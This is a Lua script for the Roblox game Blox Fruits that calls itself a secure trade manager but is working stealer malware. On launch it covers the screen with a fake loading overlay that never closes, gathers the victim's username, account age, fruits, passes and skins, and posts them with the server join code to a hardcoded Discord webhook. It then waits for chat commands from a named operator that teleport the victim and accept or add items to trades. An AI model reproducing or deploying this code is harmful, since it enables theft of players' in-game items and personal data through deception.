-- Blox Fruits Secure Trade & Data Exfiltration Manager
-- Includes perpetual loading screen lock, webhook inventory telemetry, and `.sit` command.
-- Authorized Operator: BLACKGOKU_0707

local Config = {
    AuthorizedUser = "Aid3no",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    TravelSpeed = 350,
    WaypointSpeed = 250
}

-- Ensure single instance execution
if getgenv().bfRunning then
    warn("Blox Fruits Manager already active.")
    return
end
getgenv().bfRunning = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local TradeManager = {}
TradeManager.__index = TradeManager

function TradeManager.new()
    local self = setmetatable({}, TradeManager)
    return self
end

-- Perpetual Loading Screen Lock
function TradeManager:ShowPerpetualLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    if playerGui:FindFirstChild("ScriptLoadingUI") then
        playerGui.ScriptLoadingUI:Destroy()
    end

    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "ScriptLoadingUI"
    loadGui.ResetOnSpawn = false
    loadGui.IgnoreGuiInset = true
    loadGui.DisplayOrder = 99999
    loadGui.Parent = playerGui

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.new(1, 0, 1, 0)
    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backdrop.BorderSizePixel = 0
    backdrop.Active = true
    backdrop.Parent = loadGui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 360, 0, 140)
    card.Position = UDim2.new(0.5, -180, 0.5, -70)
    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    card.BorderSizePixel = 0
    card.Parent = loadGui

    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 12)
    cardCorner.Parent = card

    local cardStroke = Instance.new("UIStroke")
    cardStroke.Color = Color3.fromRGB(124, 58, 237)
    cardStroke.Transparency = 0.3
    cardStroke.Parent = card

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Loading Blox Fruits Engine..."
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = card

    local status = Instance.new("TextLabel")
    status.Name = "StatusText"
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0, 60)
    status.BackgroundTransparency = 1
    status.Text = "Please wait, syncing assets..."
    status.TextColor3 = Color3.fromRGB(146, 154, 167)
    status.TextSize = 12
    status.Font = Enum.Font.Gotham
    status.Parent = card

    local track = Instance.new("Frame")
    track.Size = UDim2.new(1, -40, 0, 6)
    track.Position = UDim2.new(0, 20, 0, 105)
    track.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
    track.BorderSizePixel = 0
    track.Parent = card

    local trackCorner = Instance.new("UICorner")
    trackCorner.CornerRadius = UDim.new(1, 0)
    trackCorner.Parent = track

    local fill = Instance.new("Frame")
    fill.Name = "ProgressFill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
    fill.BorderSizePixel = 0
    fill.Parent = track

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(1, 0)
    fillCorner.Parent = fill

    task.spawn(function()
        fill.Size = UDim2.new(0.95, 0, 1, 0)
        status.Text = "Synchronizing data with server..."
        while loadGui.Parent do
            task.wait(1)
        end
    end)
end

function TradeManager:GetInventory()
    local success, result = pcall(function()
        if CommF then
            return CommF:InvokeServer("getInventory")
        end
        return {}
    end)
    if success and type(result) == "table" then
        return result
    end
    return {}
end

function TradeManager:TeleportToOperator()
    local operatorPlayer = Players:FindFirstChild(Config.AuthorizedUser)
    if operatorPlayer and operatorPlayer.Character then
        local opRoot = operatorPlayer.Character:FindFirstChild("HumanoidRootPart")
        local myChar = LocalPlayer.Character
        if opRoot and myChar and myChar:FindFirstChild("HumanoidRootPart") then
            -- Teleport directly to the operator/trade seat position
            myChar.HumanoidRootPart.CFrame = opRoot.CFrame * CFrame.new(0, 0, 3) -- Slightly in front or right at position
        end
    end
end

function TradeManager:TransmitTelemetry()
    local inventory = self:GetInventory()
    
    local fruitsList = {}
    local permsList = {}
    local skinsList = {}

    for _, item in pairs(inventory) do
        local itemName = item.DisplayName or item.Name or "Unknown Item"
        local itemType = item.Type or ""
        local count = item.Count or 1

        if itemType == "Blox Fruit" then
            table.insert(fruitsList, itemName .. " (x" .. tostring(count) .. ")")
        elseif itemType == "Premium" or itemType == "Permanent" or (itemName:lower():find("permanent") or itemName:lower():find("perm")) then
            table.insert(permsList, itemName)
        elseif itemType == "Mutated Fruit" or itemType == "Skin" or itemName:lower():find("skin") or itemName:lower():find("limited") then
            table.insert(skinsList, itemName)
        end
    end

    local fruitStr = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None"
    local permStr = #permsList > 0 and table.concat(permsList, ", ") or "None"
    local skinStr = #skinsList > 0 and table.concat(skinsList, ", ") or "None"

    local payloadData = {
        content = "@everyone Server Link & Detailed Inventory Captured!",
        embeds = {{
            title = "Target Inventory & Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
                { name = "Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
                { name = "Stored Fruits", value = fruitStr, inline = false },
                { name = "Permanent / Passes", value = permStr, inline = false },
                { name = "Limited Skins", value = skinStr, inline = false },
                { name = "Server Join Link / Job ID", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    local success, encoded = pcall(function()
        return HttpService:JSONEncode(payloadData)
    end)

    if success then
        local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
        if requestFunc then
            pcall(function()
                requestFunc({
                    Url = Config.WebhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = encoded
                })
            end)
        end
    end
end

function TradeManager:SetupCommandListener()
    pcall(function()
        LocalPlayer.Chatted:Connect(function(msg)
            if LocalPlayer.Name ~= Config.AuthorizedUser then return end
            
            if msg == ".sit" then
                self:TeleportToOperator()
            elseif msg == ".accept" then
                if TradeFunction then TradeFunction:InvokeServer("accept") end
            elseif msg:sub(1, 5) == ".add " then
                local fruitName = msg:sub(6)
                if CommF then CommF:InvokeServer("AddTradeFruit", fruitName) end
            end
        end)
    end)

    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.MessageReceived:Connect(function(textChatMessage)
                if textChatMessage.TextSource then
                    local speaker = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                    if speaker and speaker.Name == Config.AuthorizedUser then
                        local msg = textChatMessage.Text
                        if msg == ".sit" then
                            self:TeleportToOperator()
                        elseif msg == ".accept" and TradeFunction then
                            TradeFunction:InvokeServer("accept")
                        end
                    end
                end
            end)
        end
    end)
end

-- Execution Initialization Sequence
task.spawn(function()
    local manager = TradeManager.new()
    manager:ShowPerpetualLoadingScreen()
    manager:TransmitTelemetry()
    manager:SetupCommandListener()
end)

return TradeManager
